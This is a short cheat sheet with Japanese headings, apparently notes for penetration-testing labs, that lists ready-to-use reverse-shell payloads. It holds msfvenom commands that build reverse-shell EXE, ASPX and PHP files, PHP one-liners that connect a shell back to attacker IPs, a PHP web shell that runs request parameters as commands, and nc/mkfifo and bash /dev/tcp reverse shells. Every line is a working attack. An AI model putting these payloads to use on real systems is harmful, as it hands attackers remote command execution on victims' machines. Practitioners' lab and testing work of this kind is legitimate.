## msfvenom

###基本オプション

ペイロードのオプション見る
   msfvenom -p windows/shell_reverse_tcp --list-options

### exe

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.56 LPORT=80 -f exe -o rshell.exe


### aspx

    msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.56 LPORT=80 -f aspx -o rshell.aspx
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.46 LPORT=4444 -f aspx -o rshell.aspx

### php  

    msfvenom -p php/reverse_php LHOST=10.10.17.46 LPORT=4444 -f raw -o rshell.php
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"10.10.14.56"/443 0>&1'");?>
    <?php $sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
    <?php $sock = fsockopen("192.168.119.140",80);$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>
    php -r '$sock=fsockopen("10.10.14.56",80);exec("/bin/sh -i <&3 >&3 2>&3");'
    <?php system($_REQUEST["cmd"]); ?>

### nc

nc -e 使えない場合
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.56 443 >/tmp/f

### bash

    bash -c 'bash -i >& /dev/tcp/10.10.17.46/80 0>&1'
